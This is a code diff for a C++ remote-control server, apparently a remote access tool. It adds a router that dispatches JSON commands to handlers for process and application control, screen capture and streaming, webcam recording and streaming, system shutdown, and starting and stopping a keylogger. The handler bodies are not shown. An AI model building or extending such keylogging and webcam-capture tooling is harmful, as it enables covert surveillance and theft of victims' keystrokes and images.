@@ -10,6 +10,44 @@ class Router {
 public:
     using Handler = std::function<json(const json&)>;
 
-    static void registerAllHandlers(std::unordered_map<std::string, Handler>& map);
-    static json dispatch(const std::unordered_map<std::string, Handler>& map, const json& req);
+    static json dispatch(const std::unordered_map<std::string, Handler>& map, const json& req) {
+        std::string cmd = req.value("command", "");
+        auto it = map.find(cmd);
+        if (it != map.end()) {
+            return it->second(req);
+        }
+
+        return {{"type", "error"}, {"message", "unknown command: " + cmd}};
+    }
+
+    static void registerAllHandlers(std::unordered_map<std::string, Handler>& map) {
+        // Process handlers
+        map["list_processes"] = ProcessHandlers::listProcesses;
+        map["start_process"] = ProcessHandlers::startProcess;
+        map["stop_process_pid"] = ProcessHandlers::stopProcessPid;
+
+        // Application handlers
+        map["list_applications"] = ProcessHandlers::listApps;
+        map["start_application"] = ProcessHandlers::startApp;
+        map["stop_application"] = ProcessHandlers::stopApp;
+
+        // Screen capture & stream
+        map["capture_screen"] = ProcessHandlers::captureScreen;
+        map["start_screen_stream"] = ProcessHandlers::startScreenStream;
+        map["stop_screen_stream"] = ProcessHandlers::stopScreenStream;
+
+        // Webcam handlers
+        map["start_webcam_record"] = ProcessHandlers::startWebcamRecord;
+        map["stop_webcam_record"] = ProcessHandlers::stopWebcamRecord;
+        map["start_webcam_stream"] = ProcessHandlers::startWebcamStream;
+        map["stop_webcam_stream"] = ProcessHandlers::stopWebcamStream;
+
+        // System control
+        map["system_shutdown"] = ProcessHandlers::systemShutdown;
+        map["system_restart"] = ProcessHandlers::systemRestart;
+
+        // Keylogger
+        map["start_keylog"] = ProcessHandlers::startKeylog;
+        map["stop_keylog"] = ProcessHandlers::stopKeylog;
+    }
 };
